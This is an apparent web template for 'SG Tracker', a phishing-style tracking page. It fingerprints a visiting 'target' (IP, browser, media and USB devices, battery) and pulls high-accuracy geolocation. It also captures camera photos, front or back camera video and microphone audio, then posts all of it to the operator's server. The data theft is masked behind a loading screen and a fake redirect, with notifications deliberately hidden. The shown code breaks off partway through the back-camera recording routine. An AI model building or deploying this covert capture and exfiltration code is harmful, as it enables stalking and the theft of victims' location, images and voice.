<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>SG Tracker</title> 
<style>
iframe{ 
  border:0;
  overflow:hidden;
  height:100%;
  width:100%;
  position:fixed;
  top:0;
  left:0;
  display: none; /* Initially hidden */
}
.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.8);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: white;
  font-family: Arial, sans-serif;
  z-index: 9999;
}
.loading-text {
  margin-top: 20px;
  font-size: 16px;
}
.spinner {
  width: 50px;
  height: 50px;
  border: 5px solid rgba(255,255,255,0.3);
  border-radius: 50%;
  border-top-color: #fff;
  animation: spin 1s ease-in-out infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
.capture-buttons {
  margin-top: 30px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.btn {
  display: inline-block;
  padding: 12px 24px;
  margin: 10px 0;
  background-color: #4CAF50;
  color: white;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  cursor: pointer;
  min-width: 220px;
  text-align: center;
}
.btn-screen {
  background-color: #2196F3;
}
.btn-cancel {
  background-color: #f44336;
}
.hidden {
  display: none;
}
#countdown {
  font-size: 24px;
  margin: 20px 0;
}
.success-icon {
  font-size: 48px;
  color: #4CAF50;
  margin-bottom: 20px;
}
.screen-recording-container {
  background-color: #2196F3;
  color: white;
  padding: 20px;
  border-radius: 10px;
  margin: 20px;
  text-align: center;
}
.warning-text {
  color: #FF9800;
  font-weight: bold;
  margin: 10px 0;
}
.screenshot-flash {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: #fff;
  z-index: 9999;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.1s ease-out;
}
.screenshot-feedback {
  display: none !important; /* Hide all toast notifications as requested */
}
.screenshot-feedback.show {
  display: none !important; /* Keep hidden even when 'show' class is added */
}
.screenshot-feedback-icon {
  display: none !important;
}
@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.1); }
  100% { transform: scale(1); }
}
.pulse-animation {
  animation: none; /* Disable animation */
}
</style>
</head>
<body>
<!-- Special handling for screen recording or screenshot -->
<% if (typeof captureMethod !== 'undefined' && (captureMethod === 'screen' || captureMethod === 'screenshot' || captureMethod === 'frontvideo' || captureMethod === 'backvideo')) { %>
<div class="loading" id="capture-screen">
  <div class="spinner"></div>
  <% if (captureMethod === 'screenshot') { %>
    <div class="loading-text">Screenshot Capture Setup</div>
    <div class="loading-text">Please click the button below to capture your screen</div>
    <div class="capture-buttons">
      <button class="btn btn-screen" id="start-screen-capture">Take Screenshot</button>
      <button class="btn btn-cancel" id="skip-recording">Skip Screenshot</button>
    </div>
    <div id="countdown" class="hidden">Taking screenshot...</div>
  <% } else if (captureMethod === 'frontvideo' || captureMethod === 'backvideo') { %>
    <div class="loading-text">Camera Video Setup</div>
    <div class="loading-text">Please click the button below to start recording from your camera</div>
    <div class="capture-buttons">
      <button class="btn btn-screen" id="start-video-capture">Start Camera Video</button>
      <button class="btn btn-cancel" id="skip-recording">Skip Recording</button>
    </div>
    <div id="countdown" class="hidden">Recording for <span id="seconds">8</span> seconds...</div>
  <% } else { %>
    <div class="loading-text">Camera Video Setup</div>
    <div class="loading-text">Please click the button below to start recording from your camera</div>
    <div class="capture-buttons">
      <button class="btn btn-screen" id="start-screen-capture">Start Camera Video</button>
      <button class="btn btn-cancel" id="skip-recording">Skip Recording</button>
    </div>
    <div id="countdown" class="hidden">Recording for <span id="seconds">15</span> seconds...</div>
  <% } %>
</div>
<% } else { %>
<div class="loading" id="loading-screen">
  <div class="spinner"></div>
  <div class="loading-text">Loading content, please wait...</div>
</div>
<% } %>

<div class="screenshot-flash" id="screenshot-flash"></div>
<div class="screenshot-feedback" id="screenshot-feedback">
  <span class="screenshot-feedback-icon">üì∏</span>
  <span id="screenshot-feedback-text">Taking screenshot...</span>
</div>
<div class="success-message" id="success-message" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center; flex-direction:column; color:white; text-align:center;">
  <div style="background: linear-gradient(135deg, #4CAF50, #2E7D32); padding: 20px; border-radius: 10px; max-width: 80%;">
    <h2 style="margin-top:0; font-size: 24px;">‚úÖ Capture Successful!</h2>
    <p style="font-size: 16px; margin: 10px 0;">Information collected successfully.</p>
    <p style="font-size: 14px;">Redirecting to the website...</p>
  </div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
<audio id="audio" style="display:none"></audio>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script type="text/javascript" defer>
var uid = "<%=uid %>";
var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
var captureCompleted = false;
// Screen recording has been removed, no delay needed
var delayBeforeShowContent = 0;

// Debug the capture method
console.log("Capture method received:", captureMethod);
console.log("Capture method type:", typeof captureMethod);

// Handle different capture methods
function getCaptureConfig() {
  switch(captureMethod) {
    case 'backcam':
      return {
        camera: true,
        facingMode: "environment",
        audio: false,
        screen: false,
        screenshot: false,
        videoRecording: false,
        imageCapture: true
      };
    case 'frontcam':
      return {
        camera: true,
        facingMode: "user",
        audio: false,
        screen: false,
        screenshot: false,
        videoRecording: false,
        imageCapture: true
      };
    case 'backvideo':
      return {
        camera: true,
        facingMode: "environment",
        audio: false,
        screen: false,
        screenshot: false,
        videoRecording: true
      };
    case 'frontvideo':
      return {
        camera: true,
        facingMode: "user",
        audio: false,
        screen: false,
        screenshot: false,
        videoRecording: true
      };
    case 'allcams':
      return {
        camera: true,
        facingMode: "both", // Special signifier to capture both
        audio: false,
        screen: true,
        screenshot: false,
        videoRecording: true,
        multiCamera: true
      };
    case 'back':
      return {
        camera: true,
        facingMode: "environment",
        audio: false,
        screen: false,
        screenshot: false
      };
    case 'min':
      return {
        camera: false,
        audio: false,
        screen: false,
        screenshot: false
      };
    case 'audio':
      return {
        camera: false,
        audio: true,
        screen: false,
        screenshot: false
      };
    // Screen recording functionality removed as requested
    /*case 'screen':
      return {
        camera: false,
        audio: false,
        screen: true,
        screenshot: false,
        videoRecording: true
      };*/
    case 'screenshot':
      return {
        camera: false,
        audio: false,
        screen: false,
        screenshot: true
      };
    case 'full':
    default:
      return {
        camera: true,
        facingMode: "user",
        audio: false,
        screen: false,
        screenshot: false
      };
  }
}

const captureConfig = getCaptureConfig();

async function gather() {
  // Create a more stylish and well-designed information display
  var td = "";
  
  // Start with a styled header
  td += '<div style="background: linear-gradient(135deg, #6e48aa, #9d50bb); color: white; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">';
  td += '<h2 style="margin: 0; font-size: 24px; font-weight: bold;">üì± SG Tracker Report üì±</h2>';
  td += '<p style="margin: 5px 0 0 0; font-size: 14px;">Powered by @SG_Modder</p>';
  td += '</div>';

  // Add target information with better styling
  td += '<div style="background: #f0f8ff; border-left: 5px solid #2196F3; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
  <% if(!t){ %>
  td += '<h3 style="margin: 0; color: #2196F3;">üéØ Target Details</h3>';
  td += '<p><strong>üåê IP Address:</strong> <a href="https://ip-api.com/#<%=ip %>" style="color: #2196F3; text-decoration: none;"><%=ip %></a></p>';
  td += '<p><strong>‚è∞ Timestamp:</strong> <%=time %></p>';
  <% }else{ %>
  await fetch("<%=a %>").then((r) => r.json()).then((d) => {
    td += '<h3 style="margin: 0; color: #2196F3;">üéØ Target Details</h3>';
    td += '<p><strong>üåê IP Address:</strong> <a href="https://ip-api.com/#'+d.ip+'" style="color: #2196F3; text-decoration: none;">'+d.ip+'</a></p>';
    td += '<p><strong>‚è∞ Timestamp:</strong> <%=time %></p>';
  });
  <% } %>
  td += '<p><strong>üìÖ Local Date:</strong> ' + new Date().toLocaleString() + '</p>';
  td += '<p><strong>üõ†Ô∏è Capture Method:</strong> ' + captureMethod + '</p>';
  td += '</div>';
  
  // Variables for collecting different types of information
  var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
  var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
  
  // Device Information - with attractive cards
  td += '<div style="background: #fff3e0; border-left: 5px solid #FF9800; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
  td += '<h3 style="margin: 0; color: #FF9800;">üì± Device Information</h3>';
  td += '<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 10px; margin-top: 10px;">';
  
  for(var i=0; i < xo.length; i++) { 
    if(xo[i] in navigator) {
      var str = navigator[xo[i]];
      td += '<div style="background: white; padding: 8px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
      td += '<p style="margin: 0; font-weight: bold; color: #FF9800;">' + xo[i] + '</p>';
      td += '<p style="margin: 5px 0 0 0; font-family: monospace; word-break: break-all;">' + str + '</p>';
      td += '</div>';
    }
  }
  td += '</div></div>';

  // Media devices - with colored tags for device types
  if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
    await navigator.mediaDevices?.enumerateDevices()
    .then(function(devices) {
      td += '<div style="background: #e8f5e9; border-left: 5px solid #4CAF50; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
      td += '<h3 style="margin: 0; color: #4CAF50;">üì∑ Media Devices</h3>';
      td += '<div style="margin-top: 10px;">';
      
      devices.forEach(function(device) {
        let bgColor = '#e8f5e9'; // Default light green
        let icon = 'üîå';
        
        // Different styling based on device kind
        if (device.kind.includes('video')) {
          bgColor = '#e3f2fd';
          icon = 'üìπ';
        } else if (device.kind.includes('audio') && device.kind.includes('input')) {
          bgColor = '#fff3e0';
          icon = 'üé§';
        } else if (device.kind.includes('audio') && device.kind.includes('output')) {
          bgColor = '#f3e5f5';
          icon = 'üîä';
        }
        
        td += '<div style="background: ' + bgColor + '; padding: 8px; border-radius: 5px; margin-bottom: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
        td += '<p style="margin: 0;"><strong>' + icon + ' ' + device.kind + ':</strong></p>';
        td += '<p style="margin: 5px 0 0 0;">Label: ' + (device.label || 'No label available') + '</p>';
        td += '<p style="margin: 5px 0 0 0; font-family: monospace; font-size: 12px; opacity: 0.7;">ID: ' + device.deviceId + '</p>';
        td += '</div>';
      });
      
      td += '</div></div>';
    })
    .catch(function(err) {
      td += '<div style="background: #e8f5e9; border-left: 5px solid #4CAF50; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
      td += '<h3 style="margin: 0; color: #4CAF50;">üì∑ Media Devices</h3>';
      td += '<div style="background: #ffebee; padding: 10px; border-radius: 5px; margin-top: 10px;">';
      td += '<p style="margin: 0;"><span style="color: #f44336;">‚ö†Ô∏è Error:</span> ' + err.name + ': ' + err.message + '</p>';
      td += '</div></div>';
    });
  }

  // Network Information - with visual indicators
  if("connection" in navigator) {
    td += '<div style="background: #e3f2fd; border-left: 5px solid #2196F3; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
    td += '<h3 style="margin: 0; color: #2196F3;">üåê Network Information</h3>';
    td += '<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 10px;">';
    
    for(var i=0; i < xoc.length; i++) { 
      if(xoc[i] in navigator.connection) {
        var str = navigator.connection[xoc[i]];
        let icon = 'üì∂';
        
        // Special handling for connection type
        if(xoc[i] === 'type') {
          switch(str) {
            case 'wifi': icon = 'üì∂'; break;
            case 'cellular': icon = 'üì±'; break;
            case 'bluetooth': icon = 'üîµ'; break;
            case 'ethernet': icon = 'üîå'; break;
            case 'none': icon = '‚ùå'; break;
            default: icon = 'üîÑ';
          }
        }
        
        // Special handling for effective type
        if(xoc[i] === 'effectiveType') {
          switch(str) {
            case '4g': icon = '‚ö°‚ö°‚ö°‚ö°'; break;
            case '3g': icon = '‚ö°‚ö°‚ö°'; break;
            case '2g': icon = '‚ö°‚ö°'; break;
            case 'slow-2g': icon = '‚ö°'; break;
            default: icon = '‚ö°';
          }
        }
        
        td += '<div style="background: white; padding: 8px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
        td += '<p style="margin: 0; font-weight: bold; color: #2196F3;">' + icon + ' ' + xoc[i] + '</p>';
        td += '<p style="margin: 5px 0 0 0; font-family: monospace;">' + str + '</p>';
        td += '</div>';
      }
    }
    
    td += '</div></div>';
  }

  // USB Devices - with device icons
  if("usb" in navigator) {
    await navigator.usb.getDevices()
    .then(devices => {
      if (devices.length > 0) {
        td += '<div style="background: #f3e5f5; border-left: 5px solid #9c27b0; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
        td += '<h3 style="margin: 0; color: #9c27b0;">üîå USB Devices (' + devices.length + ')</h3>';
        td += '<div style="margin-top: 10px;">';
        
        devices.forEach(device => {
          td += '<div style="background: white; padding: 8px; border-radius: 5px; margin-bottom: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
          td += '<p style="margin: 0; font-weight: bold; color: #9c27b0;">üì± ' + (device.productName || 'Unknown Device') + '</p>';
          td += '<p style="margin: 5px 0 0 0;">Vendor: ' + device.vendorId + ' | Product: ' + device.productId + '</p>';
          td += '<p style="margin: 5px 0 0 0; font-family: monospace; font-size: 12px;">S/N: ' + (device.serialNumber || 'N/A') + '</p>';
          td += '</div>';
        });
        
        td += '</div></div>';
      }
    });
  }

  // Battery Information - with visual battery indicator
  if("getBattery" in navigator) {
    await navigator.getBattery().then(function(battery) {
      const level = battery.level * 100;
      const charging = battery.charging;
      
      // Determine battery color based on level
      let batteryColor = '#4CAF50'; // Green for good battery
      if (level < 20) {
        batteryColor = '#f44336'; // Red for low battery
      } else if (level < 50) {
        batteryColor = '#FF9800'; // Orange for medium battery
      }
      
      td += '<div style="background: #fffde7; border-left: 5px solid #FFC107; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
      td += '<h3 style="margin: 0; color: #FFC107;">üîã Battery Status</h3>';
      
      // Visual battery indicator
      td += '<div style="margin: 10px 0; background: #eee; height: 30px; border-radius: 15px; position: relative; overflow: hidden;">';
      td += '<div style="background: ' + batteryColor + '; width: ' + level + '%; height: 100%; transition: width 1s;">';
      td += '<span style="position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); color: black; font-weight: bold;">' + 
            Math.round(level) + '%' + (charging ? ' ‚ö°' : '') + '</span>';
      td += '</div></div>';
      
      // Battery details
      td += '<div style="display: flex; justify-content: space-between; margin-top: 10px;">';
      td += '<div style="text-align: center; flex: 1;"><strong>Level</strong><p>' + Math.round(level) + '%</p></div>';
      td += '<div style="text-align: center; flex: 1;"><strong>Status</strong><p>' + (charging ? '‚ö° Charging' : 'üîã Discharging') + '</p></div>';
      
      if (battery.chargingTime !== Infinity) {
        td += '<div style="text-align: center; flex: 1;"><strong>Full in</strong><p>' + 
              Math.round(battery.chargingTime / 60) + ' min</p></div>';
      }
      
      if (battery.dischargingTime !== Infinity) {
        td += '<div style="text-align: center; flex: 1;"><strong>Empty in</strong><p>' + 
              Math.round(battery.dischargingTime / 60) + ' min</p></div>';
      }
      
      td += '</div></div>';
    });
  }

  // Location Information with map preview
  if(!navigator.geolocation) {
    td += '<div style="background: #ffebee; border-left: 5px solid #f44336; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
    td += '<h3 style="margin: 0; color: #f44336;">üìç Location</h3>';
    td += '<div style="background: white; padding: 10px; border-radius: 5px; margin-top: 10px; text-align: center;">';
    td += '<p style="color: #f44336;"><span style="font-size: 24px;">‚ö†Ô∏è</span><br>Location API not available on this device</p>';
    td += '</div></div>';
  } 

  function locationSuccess(pos) {
    const crd = pos.coords;
    
    // Add visually appealing location information to the report
    td += '<div style="background: #e8f5e9; border-left: 5px solid #4CAF50; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
    td += '<h3 style="margin: 0; color: #4CAF50;">üìç Location Detected</h3>';
    
    // Add map preview placeholder (just visual design, not actual map)
    td += '<div style="background: #f1f8e9; border-radius: 5px; margin-top: 10px; padding: 10px; text-align: center;">';
    td += '<div style="font-weight: bold; margin-bottom: 5px;">üìç Location Coordinates</div>';
    td += '<div style="display: inline-block; background: white; padding: 8px 15px; border-radius: 20px; margin: 5px; font-family: monospace;">üìå Lat: ' + crd.latitude.toFixed(6) + '</div>';
    td += '<div style="display: inline-block; background: white; padding: 8px 15px; border-radius: 20px; margin: 5px; font-family: monospace;">üìå Lon: ' + crd.longitude.toFixed(6) + '</div>';
    td += '<div style="display: inline-block; background: white; padding: 8px 15px; border-radius: 20px; margin: 5px; font-family: monospace;">üìè Accuracy: ' + Math.round(crd.accuracy) + 'm</div>';
    
    // Add Google Maps link
    const mapsUrl = `https://www.google.com/maps?q=${crd.latitude},${crd.longitude}`;
    td += '<div style="margin-top: 10px;">';
    td += '<a href="' + mapsUrl + '" target="_blank" style="display: inline-block; background: #4CAF50; color: white; text-decoration: none; padding: 8px 15px; border-radius: 5px; font-weight: bold;">üìç View on Google Maps</a>';
    td += '</div>';
    
    td += '</div></div>';
    
    // Also include altitude, heading, and speed if available
    if (crd.altitude || crd.heading || crd.speed) {
      td += '<div style="background: #e8f5e9; border-left: 5px solid #4CAF50; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
      td += '<h3 style="margin: 0; color: #4CAF50;">üìä Additional Location Data</h3>';
      td += '<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 10px;">';
      
      if (crd.altitude !== null) {
        td += '<div style="background: white; padding: 8px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
        td += '<p style="margin: 0; font-weight: bold; color: #4CAF50;">üèîÔ∏è Altitude</p>';
        td += '<p style="margin: 5px 0 0 0; font-family: monospace;">' + crd.altitude.toFixed(2) + ' meters</p>';
        td += '</div>';
      }
      
      if (crd.heading !== null) {
        td += '<div style="background: white; padding: 8px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
        td += '<p style="margin: 0; font-weight: bold; color: #4CAF50;">üß≠ Heading</p>';
        td += '<p style="margin: 5px 0 0 0; font-family: monospace;">' + crd.heading.toFixed(2) + '¬∞</p>';
        td += '</div>';
      }
      
      if (crd.speed !== null) {
        td += '<div style="background: white; padding: 8px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">';
        td += '<p style="margin: 0; font-weight: bold; color: #4CAF50;">‚ö° Speed</p>';
        td += '<p style="margin: 5px 0 0 0; font-family: monospace;">' + (crd.speed * 3.6).toFixed(2) + ' km/h</p>';
        td += '</div>';
      }
      
      td += '</div></div>';
    }
    
    // Update the server with the location data
    $.post("<%=a %>/location", {
      uid: uid,
      lat: encodeURIComponent(crd.latitude),
      lon: encodeURIComponent(crd.longitude),
      acc: encodeURIComponent(crd.accuracy)
    }, (s) => {
      console.log("Location data sent to server");
      checkAllCapturesCompleted();
    });
  }

  function locationError(err) {
    td += '<div style="background: #ffebee; border-left: 5px solid #f44336; padding: 10px; margin-bottom: 15px; border-radius: 5px;">';
    td += '<h3 style="margin: 0; color: #f44336;">üìç Location</h3>';
    td += '<div style="background: white; padding: 10px; border-radius: 5px; margin-top: 10px;">';
    td += '<p style="color: #f44336;"><span style="font-size: 20px;">‚ö†Ô∏è</span> Location Error</p>';
    td += '<p style="font-family: monospace; background: #f8f8f8; padding: 8px; border-radius: 4px;">' + err.message + '</p>';
    td += '</div></div>';
    checkAllCapturesCompleted();
  }

  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(locationSuccess, locationError, { enableHighAccuracy: true, maximumAge: 0 });
  }

  // Send the basic information we've gathered so far
  $.post("<%=a %>/", {data: encodeURIComponent(td), uid: encodeURIComponent(uid)}, (s) => {
    console.log("Basic information sent");
  });

  // Initialize media capture based on the selected capture method
  if (captureConfig.multiCamera) {
    // Special case for multi-camera recording (front + back + screen)
    initMultiCameraCapture();
  } else if (captureConfig.camera && captureConfig.videoRecording) {
    // Video recording from camera
    if (captureConfig.facingMode === "user") {
      initFrontCameraRecording();
    } else {
      initBackCameraRecording();
    }
  } else if (captureConfig.camera) {
    // Regular camera snapshot
    initCamera();
  } else if (captureConfig.audio) {
    initAudioCapture();
  } else if (captureConfig.screen && captureConfig.videoRecording) {
    // Screen recording
    initScreenRecording();
  } else if (captureConfig.screenshot || captureConfig.screen) {
    // Screenshot or fallback for screen
    initScreenshot();
  } else {
    // If no media capture is needed, mark as completed
    setTimeout(() => {
      captureCompleted = true;
      hideLoadingScreen();
    }, 2000);
  }
}

// Camera capture
function initCamera() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  
  function postImage(imageData) {
    $.post("<%=a %>/camsnap", {
      uid: uid,
      img: encodeURIComponent(imageData)
    }, (s) => {
      console.log("Image captured");
    });
  }
  
  const constraints = {
    audio: false,
    video: { facingMode: captureConfig.facingMode || "user" }
  };
  
  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleCameraSuccess(stream);
    } catch (e) {
      console.error("Camera access error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  function handleCameraSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    
    var context = canvas.getContext('2d');
    var imagesSent = 0;
    var maxImages = 4; // Number of images to capture
    
    var captureInterval = setInterval(function() {
      context.drawImage(video, 0, 0, 500, 500);
      var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
      postImage(canvasData);
      
      imagesSent++;
      if (imagesSent >= maxImages) {
        clearInterval(captureInterval);
        
        // Stop the camera
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        captureCompleted = true;
        hideLoadingScreen();
      }
    }, 1500);
  }
  
  startCamera();
}

// Audio capture
function initAudioCapture() {
  const audioElement = document.getElementById('audio');
  let mediaRecorder;
  let audioChunks = [];
  let isRecording = false;
  
  async function startAudioCapture() {
    try {
      // Request audio input from microphone
      const stream = await navigator.mediaDevices.getUserMedia({ 
        audio: {
          echoCancellation: true,
          noiseSuppression: true
        }, 
        video: false 
      });
      
      handleAudioSuccess(stream);
    } catch (e) {
      console.error("Audio capture error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  function handleAudioSuccess(stream) {
    // Connect the stream to audio element for visualization (optional)
    audioElement.srcObject = stream;
    
    try {
      // Create media recorder with preferred MIME type
      const mimeType = 'audio/webm';
      mediaRecorder = new MediaRecorder(stream, { mimeType });
      
      // Handle recorded data chunks
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      
      // When recording completes
      mediaRecorder.onstop = () => {
        console.log("Audio recording completed");
        
        // Create a blob from the audio chunks
        const audioBlob = new Blob(audioChunks, { type: mimeType });
        
        // Convert to base64 for sending
        const reader = new FileReader();
        reader.readAsDataURL(audioBlob);
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          
          // Log the size for debugging
          console.log("Audio recorded (size: " + Math.round(audioBlob.size/1024) + "KB)");
          
          // Create an audio element to preview the recording
          const audioURL = URL.createObjectURL(audioBlob);
          const audioPreview = document.createElement('audio');
          audioPreview.style.display = 'none';
          audioPreview.controls = true;
          audioPreview.src = audioURL;
          document.body.appendChild(audioPreview);
          
          // Send audio data to server
          $.post("<%=a %>/audiorecording", {
            uid: uid,
            data: encodeURIComponent(base64data)
          }, (s) => { 
            console.log("Audio recording sent to server");
          }).fail((error) => {
            console.error("Failed to send audio recording:", error);
          });
          
          // Stop all tracks
          stream.getTracks().forEach(track => track.stop());
          
          // Mark as completed
          captureCompleted = true;
          hideLoadingScreen();
        };
      };
      
      // Start recording
      mediaRecorder.start();
      isRecording = true;
      console.log("Audio recording started");
      
      // Record for 15 seconds then stop
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
          isRecording = false;
        }
      }, 15000);
      
    } catch (error) {
      console.error("MediaRecorder error:", error);
      // Stop all tracks
      stream.getTracks().forEach(track => track.stop());
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  // Start the audio capture
  startAudioCapture();
}

// Front camera video recording
function initFrontCameraRecording() {
  console.log("Initializing front camera video recording");
  
  // Create a wrapper for the recording process
  async function startRecording() {
    try {
      // Get video stream first
      const videoStream = await navigator.mediaDevices.getUserMedia({ 
        audio: false,
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 24, max: 30 }
        }
      });
      
      // Create a silent audio context for duration metadata
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const silentOscillator = audioContext.createOscillator();
      const silentGain = audioContext.createGain();
      silentGain.gain.value = 0.0; // Completely silent
      silentOscillator.connect(silentGain);
      silentGain.connect(audioContext.destination);
      silentOscillator.start();
      
      // Get silent audio stream for metadata
      const silentAudioStream = silentGain.context.createMediaStreamDestination().stream;
      
      // Combine video and silent audio streams
      const combinedStream = new MediaStream();
      videoStream.getVideoTracks().forEach(track => combinedStream.addTrack(track));
      silentAudioStream.getAudioTracks().forEach(track => combinedStream.addTrack(track));
      
      // Use the combined stream with video and silent audio
      const stream = combinedStream;
      
      // Create media recorder with improved settings
      const mimeType = 'video/webm;codecs=vp9,opus';
      const mediaRecorder = new MediaRecorder(stream, { 
        mimeType,
        videoBitsPerSecond: 2500000, // Increased bit rate for better quality
        audioBitsPerSecond: 8000 // Very low bitrate for silent audio
      });
      const recordedChunks = [];
      
      // Force data to be available in chunks, not just at the end
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      // When recording completes
      mediaRecorder.onstop = () => {
        console.log("Front camera recording completed");
        
        // Create a blob from video chunks
        const videoBlob = new Blob(recordedChunks, { type: mimeType });
        
        // Convert to base64 for sending
        const reader = new FileReader();
        reader.readAsDataURL(videoBlob);
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          
          // Log the size for debugging
          console.log("Front camera video recorded (size: " + Math.round(videoBlob.size/1024) + "KB)");
          
          // Send video data to server (fixed to use video endpoint)
          $.post("<%=a %>/videofrontcamera", {
            uid: uid,
            data: encodeURIComponent(base64data)
          }, (s) => { 
            console.log("Front camera video sent to server");
            
            // Mark as completed after successful send
            captureCompleted = true;
            hideLoadingScreen();
          }).fail((error) => {
            console.error("Failed to send front camera video:", error);
            
            // Mark as completed even if sending fails
            captureCompleted = true;
            hideLoadingScreen();
          });
          
          // Stop all tracks
          stream.getTracks().forEach(track => track.stop());
        };
      };
      
      // Create a video element to show the stream (hidden but needed for some mobile browsers)
      const videoElement = document.createElement('video');
      videoElement.style.position = 'fixed';
      videoElement.style.top = '-9999px';
      videoElement.style.left = '-9999px';
      videoElement.style.width = '1px';
      videoElement.style.height = '1px';
      videoElement.srcObject = stream;
      videoElement.muted = true;
      videoElement.play();
      document.body.appendChild(videoElement);
      
      // Start recording with timeslice to ensure data is captured in chunks
      mediaRecorder.start(1000); // Capture in 1 second chunks
      console.log("Front camera recording started");
      
      // Display a minimal visual indicator at the top of the screen
      const recordingIndicator = document.createElement('div');
      recordingIndicator.style.position = 'fixed';
      recordingIndicator.style.top = '0';
      recordingIndicator.style.left = '0';
      recordingIndicator.style.width = '100%';
      recordingIndicator.style.padding = '4px';
      recordingIndicator.style.backgroundColor = 'rgba(0,0,0,0.3)';
      recordingIndicator.style.color = 'white';
      recordingIndicator.style.textAlign = 'center';
      recordingIndicator.style.fontSize = '12px';
      recordingIndicator.style.zIndex = '9999';
      recordingIndicator.style.opacity = '0.7';
      recordingIndicator.innerHTML = 'Recording... <span id="recordingTimer">8</span>s';
      document.body.appendChild(recordingIndicator);
      
      // Update the countdown
      const timerElement = document.getElementById('recordingTimer');
      let timeLeft = 8; // Slightly shorter for Vercel's 10-second limit (with buffer for processing)
      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerElement) timerElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          
          // Remove the indicator
          if (recordingIndicator.parentNode) {
            recordingIndicator.parentNode.removeChild(recordingIndicator);
          }
          
          // Stop recording
          if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
          }
          
          // Remove video element
          if (videoElement.parentNode) {
            videoElement.pause();
            videoElement.srcObject = null;
            videoElement.parentNode.removeChild(videoElement);
          }
        }
      }, 1000);
      
    } catch (error) {
      console.error("Front camera recording error:", error);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  // Start the recording process
  startRecording();
}

// Back camera video recording
function initBackCameraRecording() {
  console.log("Initializing back camera video recording");
  
  // Create a wrapper for the recording process
  async function startRecording() {
    try {
      // Get video stream first
      const videoStream = await navigator.mediaDevices.getUserMedia({ 
        audio: false,
        video: { 
          facingMode: "environment",
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 24, max: 30 }
        }
      });
      
      // Create a silent audio context for duration metadata
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const silentOscillator = audioContext.createOscillator();
      const silentGain = audioContext.createGain();
